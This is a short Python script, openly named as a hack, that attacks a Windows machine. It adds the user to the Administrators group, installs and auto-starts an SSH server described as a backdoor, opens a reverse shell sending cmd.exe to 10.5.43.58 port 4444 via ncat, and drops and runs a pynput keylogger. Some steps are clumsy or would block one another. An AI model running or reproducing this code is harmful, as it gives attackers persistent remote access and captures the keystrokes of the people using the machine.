import os
import sys
import subprocess
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def hack_machine():
    # Check if the script is being run as an administrator
    if not is_admin():
        print("This script must be run as an administratoooor.")
        sys.exit(1)

    # Add the current user to the Administrators group
    subprocess.call(['net', 'localgroup', 'Administrators', os.environ['USERNAME'], '/add'])

    # Install a backdoor
    subprocess.call(['powershell', 'Install-WindowsFeature', '-name', 'OpenSSH-Server'])
    subprocess.call(['powershell', 'Start-Service', 'sshd'])
    subprocess.call(['powershell', 'Set-Service', '-Name', 'sshd', '-StartupType', 'Automatic'])

    # Open a reverse shell
    subprocess.call(['ncat', '-e', 'cmd.exe', '10.5.43.58', '4444'])

    # Install a keylogger
    subprocess.call(['pip', 'install', 'pynput'])
    keylogger_script = '''
import pynput.keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
    with open("keylogger.py", "w") as f:
        f.write(keylogger_script)
    subprocess.call(['python', 'keylogger.py'])

    print("Hack complete. You now have a reverse shell and a keylogger installed.")

if __name__ == "__main__":
    hack_machine()